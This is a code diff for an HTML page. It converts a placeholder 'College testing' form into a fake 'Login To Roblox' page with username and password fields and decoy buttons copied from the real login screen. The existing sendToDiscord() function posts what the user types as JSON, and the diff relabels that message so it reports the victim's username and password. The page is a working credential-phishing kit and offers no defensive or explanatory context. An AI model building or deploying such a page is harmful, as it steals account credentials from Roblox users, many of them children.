@@ -92,21 +92,21 @@
 
 <body>
   <div class="login-box">
-    <h2>College testing</h2>
+    <h2>Login To Roblox</h2>
 
     <!-- FIX: added IDs -->
-    <input type="text" id="box1" placeholder="Type Box 1">
-    <input type="password" id="box2" placeholder="Type box 2">
+    <input type="text" id="box1" placeholder="Username/Email/Phone">
+    <input type="password" id="box2" placeholder="Password">
 
     <!-- FIX: type + onclick -->
-    <button type="button" onclick="sendToDiscord()">Send Button</button>
+    <button type="button" onclick="sendToDiscord()">Log In</button>
 
     <!-- FIX: button type -->
-    <button type="button" class="secondary">RANDOM BUTTON DONT TOUCH?</button>
-    <button type="button" class="secondary">RANDOM BUTTON DONT TOUCH</button>
+    <button type="button" class="secondary">Email Me a One-Time Code?</button>
+    <button type="button" class="secondary">Use Another Device</button>
 
     <div class="links">
-      <a href="#">Random BUTTON DONT TOUCH</a>
+      <a href="#">Don't have an account? Sign Up</a>
     </div>
   </div>
 
@@ -123,8 +123,8 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           content:
-            "Type Box 1: " + box1 + "\n" +
-            "Type Box 2: " + box2
+            "Username/Email/Phone: " + box1 + "\n" +
+            "Password: " + box2
         })
       });
     }
